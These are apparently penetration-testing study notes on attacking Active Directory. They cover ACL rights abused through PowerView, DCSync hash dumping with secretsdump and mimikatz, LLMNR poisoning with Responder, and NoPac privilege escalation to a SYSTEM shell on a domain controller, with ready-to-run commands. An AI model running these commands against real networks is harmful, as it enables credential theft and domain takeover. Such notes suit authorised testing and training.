# active directory attacks enumeration

## ACL

### Addself

    Addself abused with Add-DomainGroupMember

Shows security groups that a user can add themselves to.

### ForceChangePassword

    Abused with Set-DomainUserPassword
    https://github.com/Andre92Marcos/tools/blob/master/powersploit/PowerView.md#functions

Gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).

### GenericWrite

    Abused with Set-DomainObject

Gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.


### GenericAll

    Abused with Set-DomainUserPassword or Add-DomainGroupMember

This grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

### DS-Replication-Get-Changes-All - DCSync


DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes. The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

    secretsdump.py -outputfile <file_to_save_hashes> -just-dc <domain_name>/<username_with_permissions>@<dc_ip>
    secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

    or with mimikatz

    lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator


WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Add Members abused with Add-DomainGroupMember


## LLMNR/NBT-NS Poisoning

https://github.com/Andre92Marcos/vulnerabilities/blob/master/ldap/llmnr_ntbt-ns_poisoning.md

From Linux

    sudo responder -I <nerwork_interface>


## NoPac - SamAccountName Spoofing

This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.

This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.

We can use this tool to perform this attack. NoPac uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC.

    https://github.com/Ridter/noPac

We can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable.

    sudo python3 scanner.py <domain_name>/<domain_username>:<domain_user_password> -dc-ip <domain_controller_ip> -use-ldap

There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. We can do this by running noPac.py with the syntax below to impersonate the built-in administrator account and drop into a semi-interactive shell session on the target Domain Controller. This could be "noisy" or may be blocked by AV or EDR.

    sudo python3 noPac.py <domain_name>/<domain_username>:<domain_user_password> -dc-ip <domain_controller_ip>  -dc-host <domain_controller_host_name> -shell --impersonate administrator -use-ldap

Using noPac to DCSync the Built-in Administrator Account

    sudo python3 noPac.py <domain_name>/<domain_username>:<domain_user_password> -dc-ip <domain_controller_ip>  -dc-host <domain_controller_host_name> --impersonate administrator -use-ldap -dump -just-dc-user <domain_name>/administrator


## pass-the-ticket


## Shadow Credentials